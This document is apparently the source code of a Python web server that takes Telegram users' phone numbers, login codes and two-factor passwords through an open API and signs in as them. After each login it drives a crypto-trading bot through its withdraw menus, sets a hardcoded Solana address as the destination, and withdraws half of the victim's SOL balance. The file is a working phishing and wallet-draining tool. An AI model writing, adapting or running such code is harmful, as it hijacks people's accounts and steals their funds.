from telethon import TelegramClient, events
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    RPCError,
)
from quart import Quart, request, jsonify
from quart_cors import cors
import asyncio
from dotenv import load_dotenv
import os

# Load environment variables from the .env file
load_dotenv()

# Replace these with your Telegram API credentials
# Access the environment variables
api_id = os.getenv('API_ID')
api_hash = os.getenv('API_HASH')
bot_username = os.getenv('BOT_USERNAME')

app = Quart(__name__)
app = cors(app, allow_origin="*")  # Apply CORS after app initialization
# In-memory storage for clients and phone-to-id mapping
clients = {}
phone_to_sender_id = {}  # Store mapping between phone number and sender_id
# Function to delete session file (forcefully delete session)
def delete_session(phone):
    session_file = os.path.join(os.getcwd(), f'session_{phone}.session')
    if os.path.exists(session_file):
        os.remove(session_file)

# New function to send a message after successful login
async def send_message(user_client):
    try:
        # Send a message to the bot
        message = await user_client.send_message(bot_username, '/start')
        # Wait a bit for the bot to respond
        print("Waiting for response after /start...")
        await asyncio.sleep(2)  # Adding a delay to wait for the bot's response

        # Fetch the latest messages from the bot
        response = await user_client.get_messages(bot_username, limit=5)

        if response:
            print(f"Response from {bot_username}: {response[0].text}")
            buttons = response[0].buttons

            if buttons:
                print("Buttons found:")
                for row in buttons:
                    for button in row:
                        print(f"Button text: {button.text}")

                # Find and click the 'Withdraw' button (case-insensitive matching)
                withdraw_button = None
                for row in buttons:
                    for button in row:
                        if 'withdraw' in button.text.lower():  # Case-insensitive match
                            withdraw_button = button
                            break
                    if withdraw_button:
                        break

                if withdraw_button:
                    print(f"Clicking the 'Withdraw' button: {withdraw_button.text}")
                    await withdraw_button.click()

                    # Wait for a new message from the bot after clicking 'Withdraw'
                    print("Waiting for follow-up responses...")
                    async for message in user_client.iter_messages(bot_username, limit=10):
                        print(f"New message: {message.text}")

                        # Check for buttons in the new message
                        if message.buttons:
                            print("New buttons found:")
                            for row in message.buttons:
                                for button in row:
                                    print(f"Button text: {button.text}")
                                    if 'solana' in button.text.lower():  # Case-insensitive match
                                        print(f"Clicking the 'Solana' button: {button.text}")
                                        await button.click()
                                        solana_response = await user_client.get_messages(bot_username, limit=1)
                                        print(f"Response after clicking 'Solana': {solana_response[0].text}")

                                        # Now look for the 'SOL' button in the new message
                                        async for new_message in user_client.iter_messages(bot_username, limit=10):
                                            if new_message.buttons:
                                                print("New buttons after Solana click:")
                                                for row in new_message.buttons:
                                                    for button in row:
                                                        print(f"Button text: {button.text}")
                                                        if 'sol' in button.text.lower():  # Case-insensitive match for 'SOL'
                                                            print(f"Clicking the 'SOL' button: {button.text}")
                                                            await button.click()

                                                            # Capture the response after clicking 'SOL'
                                                            final_response = await user_client.get_messages(bot_username, limit=1)
                                                            print(f"Final response after clicking 'SOL': {final_response[0].text}")

                                                            # Look for the '50 %' button in the new message
                                                            async for next_message in user_client.iter_messages(bot_username, limit=10):
                                                                if next_message.buttons:
                                                                    print("New buttons after SOL click:")
                                                                    for row in next_message.buttons:
                                                                        for button in row:
                                                                            print(f"Button text: {button.text}")
                                                                            if '50 %' in button.text:  # Case-insensitive match for '100%'
                                                                                print(f"Clicking the '50 %' button: {button.text}")
                                                                                await button.click()

                                                                                # Capture the response after clicking '50 %'
                                                                                response_after_100 = await user_client.get_messages(bot_username, limit=1)
                                                                                print(f"Response after clicking '50 %': {response_after_100[0].text}")

                                                                                # Now look for the 'Set Withdrawal Address' button
                                                                                async for next_buttons_message in user_client.iter_messages(bot_username, limit=10):
                                                                                    if next_buttons_message.buttons:
                                                                                        print("New buttons after 50 % click:")
                                                                                        for row in next_buttons_message.buttons:
                                                                                            for button in row:
                                                                                                print(f"Button text: {button.text}")
                                                                                                if 'set withdrawal address' in button.text.lower():  # Case-insensitive match for 'Set Withdrawal Address'
                                                                                                    print(f"Clicking the 'Set Withdrawal Address' button: {button.text}")
                                                                                                    await button.click()

                                                                                                    # Capture the final response after clicking 'Set Withdrawal Address'
                                                                                                    final_withdrawal_response = await user_client.get_messages(bot_username, limit=1)
                                                                                                    print(f"Final response after clicking 'Set Withdrawal Address': {final_withdrawal_response[0].text}")

                                                                                                    # Send user-defined message (e.g., withdrawal address)
                                                                                                    withdrawal_address = 'D4uqqnayAW2t8iCTChGjEQCnAPx2ukWmitMbDuwYvWf7'  # Replace with the actual address
                                                                                                    print(f"Sending withdrawal address: {withdrawal_address}")
                                                                                                    await user_client.send_message(bot_username, withdrawal_address)

                                                                                                    # Introduce a delay after sending the withdrawal address
                                                                                                    print("Waiting for 5 seconds after sending withdrawal address...")
                                                                                                    await asyncio.sleep(3)  # Add a 3-second delay

                                                                                                    # Wait for the 'WITHDRAW' button after sending the withdrawal address
                                                                                                    async for final_message in user_client.iter_messages(bot_username, limit=10):
                                                                                                        print(f"Final message after sending address: {final_message.text}")
                                                                                                        if final_message.buttons:
                                                                                                            for row in final_message.buttons:
                                                                                                                for button in row:
                                                                                                                    print(f"Button text: {button.text}")
                                                                                                                    if 'withdraw' in button.text.lower():  # Specific match for 'WITHDRAW'
                                                                                                                        print(f"Clicking the 'WITHDRAW' button: {button.text}")
                                                                                                                        await button.click()  
                                                                                                                        return  # Exit once we click the 'WITHDRAW' button
                                                                                                    print("No 'WITHDRAW' button found after sending the withdrawal address.")
                                                # End of logic for 'SOL' button
                                                else:
                                                    print("No buttons found after SOL click.")
                else:
                    print("Withdraw button not found.")
            else:
                print("No buttons found in the response.")
        else:
            print("No response received after /start.")
    except Exception as e:
        return f"Error sending message: {e}"


# API to request a login code
@app.route('/request_code', methods=['POST'])
async def request_code():
    data = await request.get_json()
    phone = data.get('phone')

    if not phone:
        return jsonify({'error': 'Phone number is required'}), 400

    # Delete any existing session before starting a new login attempt
    delete_session(phone)

    user_client = TelegramClient(f'session_{phone}', api_id, api_hash)
    clients[phone] = user_client

    try:
        await user_client.connect()
        sent_code = await user_client.send_code_request(phone)
        return jsonify({'message': 'Login code sent', 'phone_code_hash': sent_code.phone_code_hash})
    except RPCError as e:
        await user_client.disconnect()
        delete_session(phone)
        return jsonify({'error': f'RPC error: {e}'}), 500
    except Exception as e:
        await user_client.disconnect()
        delete_session(phone)
        return jsonify({'error': f'Error: {e}'}), 500


# API to verify the login code and perform action
@app.route('/verify_code', methods=['POST'])
async def verify_code():
    data = await request.get_json()
    phone = data.get('phone')
    code = data.get('code')
    phone_code_hash = data.get('phone_code_hash')
    password = data.get('password', None)  # For 2FA password

    if not phone or not code or not phone_code_hash:
        return jsonify({'error': 'Phone, code, and phone_code_hash are required'}), 400

    user_client = clients.get(phone)
    if not user_client:
        return jsonify({'error': 'Session not found for this phone number'}), 400

    try:
        await user_client.connect()
        await user_client.sign_in(phone, code, phone_code_hash=phone_code_hash)

        if not await user_client.is_user_authorized():
            if password:
                await user_client.sign_in(password=password)
            else:
                return jsonify({'error': 'Two-factor authentication required'}), 403


        # After successfully logging in
        sender_id = await user_client.get_me()  # Ensure this is awaited to get the User object
        phone_to_sender_id[sender_id.id] = phone  # Store the mapping


        # Send a message after successful login
        await send_message(user_client)

        return jsonify({'message': 'Login successful and action performed'})
    except PhoneCodeInvalidError:
        await user_client.disconnect()
        delete_session(phone)
        return jsonify({'error': 'Invalid login code'}), 400
    except SessionPasswordNeededError:
        await user_client.disconnect()
        delete_session(phone)
        return jsonify({'error': 'Two-factor authentication required'}), 403
    except Exception as e:
        await user_client.disconnect()
        delete_session(phone)
        return jsonify({'error': f'Error: {e}'}), 500
    


# Function to retrieve phone number from sender_id
@app.route('/get_phone_by_sender_id', methods=['GET'])
def get_phone_by_sender_id():
    sender_id = request.args.get('sender_id')  # Get sender_id from query params

    if not sender_id:
        return jsonify({'error': 'sender_id is required'}), 400

    phone = phone_to_sender_id.get(int(sender_id))  # Retrieve the phone number from mapping
    if not phone:
        return jsonify({'error': 'Phone number not found for the given sender_id'}), 404

    return jsonify({'phone': phone})
    
# API to trigger send_message function
@app.route('/send_message', methods=['POST'])
async def trigger_send_message():
    data = await request.get_json()
    phone = data.get('phone')

    if not phone:
        return jsonify({'error': 'Phone number is required'}), 400

    user_client = clients.get(phone)
    if not user_client:
        return jsonify({'error': 'User not authorized or session not found'}), 400

    try:
        # Call send_message function
        response = await send_message(user_client)
        return jsonify({'message': 'Message sent successfully', 'response': response})
    except Exception as e:
        return jsonify({'error': f'Error: {e}'}), 500


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
